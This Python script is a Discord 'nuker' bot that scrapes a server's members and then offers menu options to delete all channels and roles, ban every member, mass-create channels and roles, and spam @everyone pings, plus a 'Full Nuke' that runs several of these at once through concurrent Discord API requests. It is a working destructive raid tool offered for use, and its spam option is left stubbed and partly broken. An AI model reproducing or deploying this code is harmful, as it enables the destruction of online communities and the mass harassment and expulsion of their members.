import requests
import asyncio
import aiohttp
import discord
from discord.ext import commands
from colorama import Fore
import json
import os


startup = '''
         _____                                            
        /    /                                      .---. 
       /    /                         __.....__     |   | 
      /    /                      .-''         '.   |   | 
     /    /                      /     .-''"'-.  `. |   | 
    /    /  __    ____     _____/     /________\   \|   | 
   /    /  |  |  `.   \  .'    /|                  ||   | 
  /    '   |  |    `.  `'    .' \    .-------------'|   | 
 /    '----|  |---.  '.    .'    \    '-.____...---.|   | 
/          |  |   |  .'     `.    `.             .' |   | 
'----------|  |---'.'  .'`.   `.    `''-...... -'   '---' 
           |  |  .'   /    `.   `.                        v2.0a
          /____\'----'       '----'                       


'''

def clear(bottomText, startup=startup) :
    os.system("cls")
    print(startup)
    text = "                " + bottomText
    startup += f"\n{text}"

print(startup)
print("Made by epoch#0003")
TOKEN = input('Enter your bot token : \n')
botName = input("Enter your bot name : \n")

intents = discord.Intents.all()
intents.message_content = True

client = commands.Bot(command_prefix='!', intents=intents, log_handler=None)

@client.command()
async def scrape(ctx):
  clear("Scraping Complete.")
  global all_member_id
  all_member_id = []
  mem_count = 0
  for member in ctx.guild.members:
    all_member_id.append(member.id)
    mem_count = mem_count + 1
  global guild_id
  global chan_id
  guild_id = ctx.guild.id
  chan_id = ctx.channel.id
  await client.close()

client.run(TOKEN)

check1 = input("Press Enter to continue:  ")
os.system('cls')  #clearing console



while True:

  print(f"""           

         _____                                            
        /    /                                      .---. 
       /    /                         __.....__     |   | 
      /    /                      .-''         '.   |   | 
     /    /                      /     .-''"'-.  `. |   | 
    /    /  __    ____     _____/     /________\   \|   | 
   /    /  |  |  `.   \  .'    /|                  ||   | 
  /    '   |  |    `.  `'    .' \    .-------------'|   | 
 /    '----|  |---.  '.    .'    \    '-.____...---.|   | 
/          |  |   |  .'     `.    `.             .' |   | 
'----------|  |---'.'  .'`.   `.    `''-...... -'   '---' 
           |  |  .'   /    `.   `.                        v2.0a
          /____\'----'       '----'                        
                                                                                      

╔═════════════════════════════╦═════════════════════════════╦═════════════════════════════╗
║ [-1-] Delete all channels   ║ [-4-] Ban All               ║                             ║
║ [-2-] Mass create channels  ║ [-5-] Mass create roles     ║       [-0-] Full Nuke       ║
║ [-3-] Mass Ping/Message     ║ [-6-] Delete all roles      ║                             ║  
╚═════════════════════════════╩═════════════════════════════╩═════════════════════════════╝ 
         
    """)


  comm = input("Command: ")
  


  ## DELETE ALL CHANNELS ##
  async def get_delchan_list(del_chan_session): # this function basically gets a list of all the channels we want to delete
    tasks = []                                  # instead of running the requests one by one, we gather a big list and run them all at once
    total = int(len(all_chan_id))  # this is just a total count of channels
    count = 0  #this is the count of channels deleted so far
    for x in all_chan_id:

      count = count + 1  #this is the count of channels deleted so far
      print(f"\r >  [{count}/{total}] Channel Requests Sent", end  = " ")

      url = f"https://discord.com/api/v9/channels/{x}"
      tasks.append(asyncio.create_task(del_chan_session.delete(url = url, headers = header, ssl = False)))
      await asyncio.sleep(0.01) #0.03
    return tasks

  async def req_chan_del():  #this is hard to explain but this is the function that makes all the requests go off at once
    async with aiohttp.ClientSession() as del_chan_session:  
      tasks = await get_delchan_list(del_chan_session)
      await asyncio.gather(*tasks)


  if comm == "1":  # if the commands from the user = 1 do this
    print("")
    all_chan_id = []
    scrape_url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"  # the request url to all the channels
    header = {"authorization": "Bot " + TOKEN}   

    # scraping channel ids #
    all_chan_id_req = requests.get(scrape_url, headers = header) 
    for channel in json.loads(all_chan_id_req.text):  # this just appends all the channel IDs in the server into a list
      all_chan_id.append(channel['id'])
    asyncio.run(req_chan_del())  #this is the main function that runs all the tasks

    
  


  ## SPAM CHANNELS ##
  chan_amount = None

  async def get_chanmake_list(make_chan_session):  #this creates a list of a ton of create channel requests
    tasks = []
    count = 0
    for x in range(chan_amount):

      count = count + 1
      print(f"\r>  [{count}/{chan_amount}] Channel Requests Sent", end  = " ")

      tasks.append(asyncio.create_task(make_chan_session.post(url = url, headers = header, json = data, ssl = False)))
      await asyncio.sleep(0.03)
    return tasks

  async def req_chan_make():  #this gathers all the tasks and runs them
    async with aiohttp.ClientSession() as make_chan_session:
      tasks = await get_chanmake_list(make_chan_session)
      await asyncio.gather(*tasks)

      
  if comm == "2":   #if the commands from the user  = 2 do this
    chan_amount = int(input("Amount of Channels:  "))  #gets the amount of channels created from the user, no scraping required
    chan_name = input("Name of Channels:  ")  # gets the name of the channels from user
    print("")
    url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
    header = {"authorization": "Bot " + TOKEN}
    data = {"type": 0, "name": chan_name, "permission_overwrites": [] }  #here is the data and settings for the new channels, you can tweak the permmissions and stuff
    asyncio.run(req_chan_make()) #main function


  async def spam_chan_list(spam_session):
    data = {"content": f"@everyone {message}"}
    header = {"authorization": "Bot " + TOKEN}
    tasks = []
    count = 0
    total = len(all_chan_id)

    for x in all_chan_id:

      count = count + 1
      print(f"\r>  [{count}/{total}] Ping Requests Sent [Total Pings Sent [{pings * count}]]", end  = " ")


      url = f"https://discord.com/api/v9/channels/{x}/messages"
      for x in range(pings):
        tasks.append(asyncio.create_task(spam_session.post(url = url, data = data, headers = header)))
        await asyncio.sleep(0.02)
      await asyncio.sleep(0.02)
      

  async def req_chan_spam():
    async with aiohttp.ClientSession() as spam_session:
      tasks = await spam_chan_list(spam_session)
      await asyncio.gather(*tasks)


      
  if comm == "3":
    continue
    
  ## BAN ALL ##
  async def ban_list(ban_session):
    count = 0
    total = len(all_member_id)
    tasks = []
    header = {"authorization": "Bot " + TOKEN}
    data = {"delete_message_seconds" : 0}
    for x in all_member_id:
      
      count = count + 1

      url = f"https://discord.com/api/v9/guilds/{guild_id}/bans/{x}"
      tasks.append(asyncio.create_task(ban_session.put(url = url, headers = header, json = data, ssl = False)))
      await asyncio.sleep(0.03)
    return tasks


  async def req_ban():
    async with aiohttp.ClientSession() as ban_session:
      tasks = await ban_list(ban_session)
      await asyncio.gather(*tasks)
 
  if comm == "4":
    print("")
    asyncio.run(req_ban())


    ## ROLES SPAMMER ##
  async def crole_list(crole_session):
    count = 0
    tasks =[]
    header = {"authorization": "Bot " + TOKEN}
    data = {"name": role_name}  
    for x in range(int(amount_roles)):

      count = count + 1

      url = f"https://discord.com/api/v9/guilds/{guild_id}/roles"
      tasks.append(asyncio.create_task(crole_session.post(url = url, headers = header, json = data, ssl = False)))
      await asyncio.sleep(0.03)
    return tasks    

  async def req_role_make():
    async with aiohttp.ClientSession() as crole_session:
      tasks = await crole_list(crole_session)
      await asyncio.gather(*tasks)


  if comm == "5":
    url = f"https://discord.com/api/v9/guilds/{guild_id}/roles"
    role_name = input("Name of roles:  ")
    amount_roles = input("Role amount:  ")
    print("")
    asyncio.run(req_role_make())





    ## ROLE DELETER ##
  async def get_delrole_list(del_role_session):
    count = 0
    tasks = []
    header = {"authorization": "Bot " + TOKEN}
    total = len(all_role_id)
    for x in all_role_id:

      count = count + 1
      

      url = f"https://discord.com/api/v9/guilds/{guild_id}/roles/{x}"
      tasks.append(asyncio.create_task(del_role_session.delete(url = url, headers = header, ssl = False)))
      await asyncio.sleep(0.03)
    return tasks
  
  async def req_role_del():
    async with aiohttp.ClientSession() as del_role_session:
      tasks = await get_delrole_list(del_role_session)
      await asyncio.gather(*tasks)
  

  if comm == "6":
    print("")
    all_role_id = []
    scrape_url = f"https://discord.com/api/v9/guilds/{guild_id}/roles"
    header = {"authorization": "Bot " + TOKEN}

    all_role_id_req = requests.get(scrape_url, headers = header)
    for role in json.loads(all_role_id_req.text):
      all_role_id.append(role["id"])
    asyncio.run(req_role_del())
  
  if comm == "0":
      print("")
      all_role_id = []
      scrape_url = f"https://discord.com/api/v9/guilds/{guild_id}/roles"
      header = {"authorization": "Bot " + TOKEN}
  
      all_role_id_req = requests.get(scrape_url, headers = header)
      for role in json.loads(all_role_id_req.text):
          all_role_id.append(role["id"])
      asyncio.run(req_role_del())
      print("")
      asyncio.run(req_ban())
      print("")
      all_chan_id = []
      scrape_url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"  # the request url to all the channels
      header = {"authorization": "Bot " + TOKEN}   
      
      # scraping channel ids #
      all_chan_id_req = requests.get(scrape_url, headers = header) 
      for channel in json.loads(all_chan_id_req.text):  # this just appends all the channel IDs in the server into a list
        all_chan_id.append(channel['id'])
      asyncio.run(req_chan_del())  #this is the main function that runs all the tasks


  print("\n")
  check2 = input("SUCCESS, press enter to continue:  ")

  os.system('cls')